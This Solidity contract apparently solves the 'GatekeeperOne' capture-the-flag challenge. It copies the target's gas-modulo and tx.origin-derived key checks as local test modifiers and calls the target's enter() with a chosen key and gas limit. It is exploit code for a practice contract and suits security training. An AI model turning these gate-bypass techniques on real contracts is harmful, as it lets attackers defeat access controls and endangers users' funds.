// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IGatekeeperOne {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker  { 
  IGatekeeperOne challenge;

  constructor(address gatekeeperOneAddress) {
    challenge = IGatekeeperOne(gatekeeperOneAddress);
  }

  // modifiers below are for testing only
  modifier gateTwo() {
      require(gasleft() % 8191 == 0);
      console.log("gateTwo passed!");
      _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
      console.log("gateThree passed!");
    _;
  }

  function testEnter(bytes8 _gateKey) public view gateTwo gateThree(_gateKey) returns (bool)
  {      
      return true;
  }

  function attack(bytes8 _gateKey, uint gasLimit) public {
    challenge.enter{gas: gasLimit}(_gateKey);    
  }
}